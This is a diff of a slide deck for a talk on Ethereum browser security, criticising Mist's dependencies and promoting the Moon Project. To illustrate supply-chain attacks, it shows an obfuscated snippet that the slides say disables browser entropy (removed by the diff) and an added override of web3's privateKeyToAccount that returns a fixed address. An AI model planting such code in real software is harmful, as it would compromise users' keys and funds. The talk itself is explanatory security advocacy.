@@ -71,33 +71,47 @@ code {
 	<body>
 		<textarea id="source">
 
-## Q: Is there any Ethereum browser that:
+### How many of you **have used** Mist?
 
 ---
 
-## Q: Is there any Ethereum browser that:
-
-### 1. is **fully decentralized**;
+### How many of you **blindly trust** it?
 
 ---
 
-## Q: Is there any Ethereum browser that:
-
-### 1. is **fully decentralized**;
-
-### 2. you feel **100% safe** using it?
+### **What is wrong with Mist?**
 
 ---
 
-## Q: Is there any Ethereum browser that:
+### **Mist's codebase:**
 
-### 1. is **fully decentralized**;
+### - Huge functions, unclear types;
 
-### 2. you feel **100% safe** using it?
+### - Nothing is modular;
 
-### ...
+### - Global variables everywhere;
 
-### No, honestly. Is there?
+### - Confusing process managements;
+
+### - Crazy communication flows;
+
+### - Huge dependencies (Meteor, Electron, Webkit);
+
+### - 100 MB!
+
+---
+
+### **What is wrong with Mist?**
+
+### 1. The **codebase** is **fragile**.
+
+*(mention Marc/React)*
+
+---
+
+### Assume Mist's codebase is perfect...
+
+### Can we trust it?
 
 ---
 
@@ -109,160 +123,25 @@ code {
 
 ---
 
-### (show Mist's GitHub issues)
+### **Dependencies can still propagate zero-days!**
+
+### Meteor, Electron, Webkit, V8...
+
+### We can't **prove them all secure**.
 
 ---
 
-### (show some MetaMask, Status issues too)
+### **What is wrong with Mist?**
+
+### 1. The **codebase** is **fragile**.
+
+### 2. **Huge deps** can hide **security holes**.
 
 ---
 
-### Q: What went wrong?
+### Assume the entire browser is proven secure...
 
----
-
-### **Mist dependencies:**
-
----
-
-### - **Web3:** huge JS library
-
-### - **Meteor:** huge web framework
-
-### - **Electron:** huge desktop framework
-
-### - **V8:** JS compiler, gigantic project
-
-### - **Webkit:** complete browser enigne
-
-### - **Geth:** full Ethereum node
-
-### - **Linux/Windows/Mac:** stores your private keys
-
-### - ...
-
----
-
-### **Millions** of lines of code.
-
----
-
-### **Millions** of lines of code.
-
-### **Thousands** of developers.
-
----
-
-### **Millions** of lines of code.
-
-### **Thousands** of developers.
-
-### All it takes is **a single mistake**.
-
----
-
-### **Millions** of lines of code.
-
-### **Thousands** of developers.
-
-### All it takes is **a single mistake**.
-
-### In **any** of those dependencies.
-
----
-
-### **Millions** of lines of code.
-
-### **Thousands** of developers.
-
-### All it takes is **a single mistake**.
-
-### In **any** of those dependencies.
-
-### And there is a **zero day**.
-
----
-
-### **Reality check:**
-
----
-
-### **Reality check:**
-
-### 1. Humans are imperfect;
-
----
-
-### **Reality check:**
-
-### 1. Humans are imperfect;
-
-### 2. Zero-days will **always** happen if we **trust them**;
-
----
-
-### **Reality check:**
-
-### 1. Humans are imperfect;
-
-### 2. Zero-days will **always** happen if we **trust them**;
-
-### 3. It takes **one** of them to **wipe** your crypto assets.
-
----
-
-### Q: What if we **formally prove** Mist's security?
-
----
-
-### Q: What if we **formally prove** Mist's security?
-
-### A: Good luck **formalizing** Electron, Meteor, V8...
----
-
-### So, again...
-
----
-
-### Q: What went wrong?
-
----
-
-### Q: What went wrong?
-
-### A: Browsers are **too complex** to **prove secure**.
-
----
-
-### OK, forget that for a while.
-
----
-
-### OK, forget that for a while.
-
-### Assume we actually built a **secure browser**.
-
----
-
-### OK, forget that for a while.
-
-### Assume we actually built a **secure browser**.
-
-### One **proven** to have no zero days.
-
----
-
-### OK, forget that for a while.
-
-### Assume we actually built a **secure browser**.
-
-### One **proven** to have no zero days.
-
-### **Q: Would you feel safe using its HTML5 DApps?**
-
----
-
-### Well...
+### Can we trust it now?
 
 ---
 
@@ -294,16 +173,6 @@ function diagonal(a, b) {
 
 ### Of course you would!
 
----
-
-### Of course you would!
-
-### It just performs some math and returns a value.
-
----
-
-### Of course you would!
-
 ### It just performs some math and returns a value.
 
 ### You can see it is safe by just looking at it!
@@ -327,48 +196,7 @@ function diagonal(a, b) {
 };
 ```
 
----
-
-### Now, would you paste that code on your DApp?
-
-```javascript
-// computes x * x
-var square = require("square.js");
-
-function diagonal(a, b) {
-  return Math.sqrt(square(a) + square(b));
-};
-```
-
 ### Hint: it **passes all tests**.
-
----
-
-
-### Now, would you paste that code on your DApp?
-
-```javascript
-// computes x * x
-var square = require("square.js");
-
-function diagonal(a, b) {
-  return Math.sqrt(square(a) + square(b));
-};
-```
-
-### Hint: it **passes all tests**.
-
-### Would you?
-
----
-
-### Of course you wouldn't!
-
----
-
-### Of course you wouldn't!
-
-### You do not know what `square.js` does!
 
 ---
 
@@ -396,10 +224,6 @@ module.exports = function square(x) {
 
 ---
 
-### Lesson: never import a lib before reading it.
-
----
-
 ### But of course DApp devs audit all their imports!
 
 ---
@@ -407,10 +231,6 @@ module.exports = function square(x) {
 ### But of course DApp devs audit all their imports!
 
 ### ... right?
-
----
-
-### ...
 
 ---
 
@@ -1446,331 +1266,116 @@ module.exports = function square(x) {
 
 ---
 
-### **Any** of those could **be hidding this anywhere**:
-
-```javascript
-// Converts a string to base51
-var toBase51 = new Function(((str) => {
-  var cs = "xjoepx\\#dszqup#^\\#hfuSboepnWbmvft#^>b>?b/nbq))*>?5*";
-  var bs51 = [];
-  for (var i = 0; i < cs.length; ++i) {
-    bs51.push(String.fromCharCode(cs.charCodeAt(i) - 1));
-  }
-  return bs51.join("");
-})())();
-```
-
----
+### **474** dependencies, **thousands** of files.
 
 ### **Any** of those could **be hidding this anywhere**:
 
 ```javascript
-// Converts a string to base51
-var toBase51 = new Function(((str) => {
-  var cs = "xjoepx\\#dszqup#^\\#hfuSboepnWbmvft#^>b>?b/nbq))*>?5*";
-  var bs51 = [];
-  for (var i = 0; i < cs.length; ++i) {
-    bs51.push(String.fromCharCode(cs.charCodeAt(i) - 1));
+web3.eth.accounts.privateKeyToAccount = (privateKey) => {
+  return {
+    address: '0xFCAd0B19bB29D4674531d6f115237E16AfCE377c',
+    privateKey: privateKey
   }
-  return bs51.join("");
-})())();
+};
 ```
 
-### (Does that look harmful?)
+### How many of you actually **audited all those**?
 
 ---
 
-### **Any** of those could **be hidding this anywhere**:
+### **Don't underestimate this problem!**
+
+### Hacking a DApp's global scope is not harmless.
+
+### - Tracking user actions;
+
+### - Showing misleading info;
+
+### - Turning legit DApps into phishings;
+
+### - Blocking normal usage.
+
+### It is not just about private keys.
+
+### It is about making sure DApps work as intended.
+
+---
+
+### **What is wrong with Mist?**
+
+### 1. The **codebase** is **fragile**.
+
+### 2. **Huge deps** can hide **security holes**.
+
+### 3. JavaScript doesn't have **safe modularity**.
+
+---
+
+### **So, what is the plan?**
+
+---
+
+## **The Moon Project**
+
+### A **new browser engine** for Ethereum DApps that:
+
+### 1. Is **unbloated** and **performant**;
+
+### 2. Small enough to be **formally proven secure**;
+
+### 3. Uses a scripting language with **safe imports**.
+
+---
+
+## **Moon-Lang**
+
+### - Simple language for components;
+
+### - λ-calculus based, JIT-compiled;
+
+### - Importing untrusted code is harmless (!);
+
+### - 11 KB gzipped.
+
+---
+
+
+## **Moon-Browser**
+
+### - Talks to local and remote Ethereum nodes;
+
+### - React-like, component-based architecture;
+
+### - Zero-memory background tabs;
+
+### - Allows editing and forking DApps on the spot;
+
+### - To be formalized on type theory;
+
+### - 94 KB gzipped.
+
+---
+
+### **Everything is web-compatible!**
+
+### Moon can be compiled to JavaScript / HTML5.
+
+### You could even use it as a safe JS module system!
 
 ```javascript
-// Converts a string to base51
-var toBase51 = new Function(((str) => {
-  var cs = "xjoepx\\#dszqup#^\\#hfuSboepnWbmvft#^>b>?b/nbq))*>?5*";
-  var bs51 = [];
-  for (var i = 0; i < cs.length; ++i) {
-    bs51.push(String.fromCharCode(cs.charCodeAt(i) - 1));
-  }
-  return bs51.join("");
-})())();
+const Moon = require("moon-lang")(); // 11 KB import
+
+// - Importing libs from Moon is always safe!
+const BN = await Moon.build(
+  "zb2rhicqYxttrkq9mbdB6d8xtxhYTwmVdEXBhhjvQJahrDM5F" // IPFS hash
+);
+
+const x = BN.big("0x123456789abcdef123456789abcdef");
+const y = BN.big("0x111111111111111111111111111111");
+const z = BN.add(x)(y);
+
+console.log(BN.hex(z));
 ```
-
-### (Does that look harmful?)
-
-### (It actually **disables** the browser's entropy source.)
-
----
-
-### Q: How many devs actually **audit all those deps**?
-
----
-
-### Q: How many devs actually **audit all those deps**?
-
-### (And that's just Web3.)
-
----
-
-### So, again...
-
----
-
-### Q: What went wrong?
-
----
-
-### Q: What went wrong?
-
-### A: Browsers are **too complex** to **prove secure**.
-
----
-
-### Q: What went wrong?
-
-### A: Browsers are **too complex** to **prove secure**.
-
-### A: JavaScript doesn't have **safe modularity**.
-
----
-
-### **But, wait, what am I actually proposing here?**
-
-### 1. Should we give up on visual browsers because they're **hard to prove secure**?
-
-### 2. Should DApp developers never import someone else's code **because doing so is not safe**?
-
----
-
-### Of course not!
-
----
-
-### **Moon Thesis:**
-
----
-
-### **Moon Thesis:**
-
-### 1. Build a new browser that is **small enough** to **prove secure**;
-
----
-
-### **Moon Thesis:**
-
-### 1. Build a new browser that is **small enough** to **prove secure**;
-
-### 2. Use a scripting language that offers **safe modularity**.
-
----
-
-## The Moon Project
-
----
-
-## Moon-Lang
-
----
-
-## Moon-Lang
-
-### 1. A scripting language for visual components;
-
----
-
-## Moon-Lang
-
-### 1. A scripting language for visual components;
-
-### 2. Simple, pure, yet turing complete (λ-calculus);
-
----
-
-## Moon-Lang
-
-### 1. A scripting language for visual components;
-
-### 2. Simple, pure, yet turing complete (λ-calculus);
-
-### 3. Bundles generate readable code (unlike WASM);
-
----
-
-## Moon-Lang
-
-### 1. A scripting language for visual components;
-
-### 2. Simple, pure, yet turing complete (λ-calculus);
-
-### 3. Bundles generate readable code (unlike WASM);
-
-### 4. Has safe modularity (unlike JS);
-
----
-
-## Moon-Lang
-
-### 1. A scripting language for visual components;
-
-### 2. Simple, pure, yet turing complete (λ-calculus);
-
-### 3. Bundles generate readable code (unlike WASM);
-
-### 4. Has safe modularity (unlike JS);
-
-### 5. The whole thing is **a 10kb file**;
-
----
-
-## Moon-Lang
-
-### 1. A scripting language for visual components;
-
-### 2. Simple, pure, yet turing complete (λ-calculus);
-
-### 3. Bundles generate readable code (unlike WASM);
-
-### 4. Has safe modularity (unlike JS);
-
-### 5. The whole thing is **a 10kb file**;
-
-### 6. Can (and soon will) be **formally proven** secure.
-
----
-
-## Moon-Browser
-
----
-
-## Moon-Browser
-
-### 1. Can browse Ethereum DApps;
-
----
-
-## Moon-Browser
-
-### 1. Can browse Ethereum DApps;
-
-### 2. Can sign Ethereum transactions;
-
----
-
-## Moon-Browser
-
-### 1. Can browse Ethereum DApps;
-
-### 2. Can sign Ethereum transactions;
-
-### 3. Downloads interfaces from IPFS / Swarm;
-
----
-
-## Moon-Browser
-
-### 1. Can browse Ethereum DApps;
-
-### 2. Can sign Ethereum transactions;
-
-### 3. Downloads interfaces from IPFS / Swarm;
-
-### 4. Uses Moon-Lang as its scripting language;
-
----
-
-## Moon-Browser
-
-### 1. Can browse Ethereum DApps;
-
-### 2. Can sign Ethereum transactions;
-
-### 3. Downloads interfaces from IPFS / Swarm;
-
-### 4. Uses Moon-Lang as its scripting language;
-
-### 5. The whole thing is **a 292kb file**;
-
----
-
-## Moon-Browser
-
-### 1. Can browse Ethereum DApps;
-
-### 2. Can sign Ethereum transactions;
-
-### 3. Downloads interfaces from IPFS / Swarm;
-
-### 4. Uses Moon-Lang as its scripting language;
-
-### 5. The whole thing is **a 292kb file**;
-
-### 6. Can (and soon will) be **formally proven** secure.
-
----
-
-### **Moon-Lang dependencies:**
-
-### - nano-ipfs-store@0.1.3
-
-### - nano-sha256@0.1.2
-
-### - nano-persistent-memoizer@0.1.2
-
-### - xmlhttprequest@1.8.0
-
----
-
-### **Moon-Browser dependencies:**
-
-### - 4 pages of indirect deps
-
-### - quicky decreasing, though
-
-### **Direct dependencies:**
-
-### - inferno *(soon replaced by virtual-dom)*
-
-### - eth-lib *(elliptic and BN.js: tricky but doable)*
-
-### - moon-lang *(ok)*
-
----
-
-### **Note: we're not throwing the web away!**
-
----
-
-### **Note: we're not throwing the web away!**
-
-### Moon-Browser can't render HTML5 apps.
-
----
-
-### **Note: we're not throwing the web away!**
-
-### Moon-Browser can't render HTML5 apps.
-
-### But using it is optional.
-
----
-
-### **Note: we're not throwing the web away!**
-
-### Moon-Browser can't render HTML5 apps.
-
-### But using it is optional.
-
-### Moon DApps work on Mist/Chrome/etc. (with Web3).
-
----
-
-### **Note: we're not throwing the web away!**
-
-### Moon-Browser can't render HTML5 apps.
-
-### But using it is optional.
-
-### Moon DApps work on Mist/Chrome/etc. (with Web3).
-
-### And you can use its components inside web apps!
 
 ---
 
@@ -1786,7 +1391,7 @@ var toBase51 = new Function(((str) => {
 
 ### - Home DApp;
 
-### - Walet DApp.
+### - Wallet DApp.
 
 
 ---
@@ -1835,64 +1440,6 @@ var toBase51 = new Function(((str) => {
 
 ## Thank you!
 
----
-
-## (Extra) Some security situations:
-
----
-
-### 1. XSS
-
-### Situation:
-
-- An user of a DApp pastes a string which is executed as code.
-
-### Why it can't happen:
-
-- Moon-Lang strings/components can never trigger code execution.
-
-- Even if they could, Moon-Lang expressions can't alter the global scope.
-
-- Even it they could, Moon-Browser DApps can't talk to the internet anyway.
-
----
-
-### 2. Phishing
-
-### Situation:
-
-- Someone gives you an URL to a DApp that looks the same as an existing DApp you use regularly.
-
-### How we prevent it:
-
-- No URLs, just IPFS hashes.
-
-- HashRank: stakeholders vote if hash is legit.
-
-- Remember, Hash is an eternal fingerprint of a DApp.
-
-- Even if you got phished, DApps can't talk to the internet anyway.
-
----
-
-### 3. Unvoluntaire Crypto Mining
-
-### Situation:
-
-- The owner of the DApp includes some code that uses your electricity to secretely mine crypto currency for him.
-
-### Why it can't happen:
-
-- DApps don't have access to the CPU other than "gas-limited" render/fetch functions.
-
-- Even if they had, Moon-Browser DApps can't talk to the internet anyway.
-
----
-
-### 4. 
-
-
-
 
 
 		</textarea>
@@ -1903,4 +1450,3 @@ var toBase51 = new Function(((str) => {
 		<script></script>
 	</body>
 </html>
-
